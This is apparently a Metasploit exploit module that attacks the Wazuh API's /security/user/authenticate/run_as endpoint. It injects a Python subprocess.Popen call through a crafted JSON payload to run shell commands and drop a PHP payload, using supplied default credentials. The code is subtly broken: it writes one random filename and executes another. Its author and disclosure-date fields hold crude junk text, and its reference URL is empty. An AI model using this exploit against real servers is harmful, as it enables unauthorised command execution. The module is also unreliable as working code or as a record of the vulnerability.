##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wazuh API Authenticated RCE',
        'Description' => %q{
          This module exploits an authenticated remote code execution vulnerability in the
          Wazuh API endpoint `/security/user/authenticate/run_as`. By abusing a JSON payload
          with an unhandled exception, attackers can execute arbitrary commands as the Wazuh user.
          Authentication is required via valid credentials.
        },
        'Author' => ['THERE AINT NO PARTY LIKE A DIDDY PARTY'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', '']
        ],
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 55000
        },
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'Privileged' => false,
        'Targets' => [['Automatic', {}]],
        'DisclosureDate' => 'BOOBIES',
        'DefaultTarget' => 0
      )
    )

    register_options([
      OptString.new('USERNAME', [true, 'Wazuh API username', 'wazuh-wui']),
      OptString.new('PASSWORD', [true, 'Wazuh API password', 'MyS3cr37P450r.*-']),
      OptString.new('TARGETURI', [true, 'Base path to Wazuh API', '/'])
    ])
  end

  def exploit
    php_payload = "<?php #{payload.encoded} ?>"
    cmd = "echo '#{php_payload}' > #{Rex::Text.rand_text_alpha(8)}.php && php #{Rex::Text.rand_text_alpha(8)}.php"
    json_payload = {
      "__unhandled_exc__" => {
        "__class__" => "subprocess.Popen",
        "__args__" => [
          ["/bin/sh", "-c", cmd]
        ]
      }
    }.to_json

    creds = "#{datastore['USERNAME']}:#{datastore['PASSWORD']}"
    auth_header = "Basic #{Rex::Text.encode_base64(creds)}"
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'security', 'user', 'authenticate', 'run_as'),
      'ctype' => 'application/json',
      'headers' => {
        'Authorization' => auth_header
      },
      'data' => json_payload
    }, 5)
    handler
  end
end
